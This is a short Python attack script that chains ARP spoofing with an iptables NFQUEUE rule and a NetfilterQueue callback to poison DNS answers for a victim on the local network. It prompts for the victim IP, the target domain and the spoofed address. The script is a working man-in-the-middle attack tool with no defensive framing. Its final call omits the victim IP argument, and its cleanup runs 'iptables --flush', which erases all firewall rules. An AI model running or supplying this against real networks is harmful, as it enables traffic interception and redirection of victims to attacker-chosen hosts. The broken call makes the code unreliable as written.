import os

from functions import *
from arp_spoofing import arp_spoofing
from functools import partial
from netfilterqueue import NetfilterQueue

def dns_spoofing(victim_ip, domain, host, output = False):
    """
    Performs the DNS spoofing attack
    
    Step 1: Starting ARP spoofing
    Step 2: Insert FORWARD rule in iptables
    Step 3: Start Netfilter queue
    Step 4: Bind the queue to our "process" callback
    Step 5: Run the queue
    Step 6: Removing FORWARD rule from iptables
    """

    # Step 1
    arp_spoofing(victim_ip, output)

    QUEUE_NUM = 0
    
    # Step 2
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    
    # Step 3
    queue = NetfilterQueue()

    try:
        # Step 4
        queue.bind(QUEUE_NUM, partial(process_packet, domain, host, output))
        
        # Step 5
        queue.run()
    except KeyboardInterrupt:
        # Step 6
        os.system("iptables --flush")

victim_ip = input("Enter victim's IP address: ")
domain = input("Enter the domain to poison: ")
host = input("Enter the ip for the mapping: ")
dns_spoofing(domain, host, True)

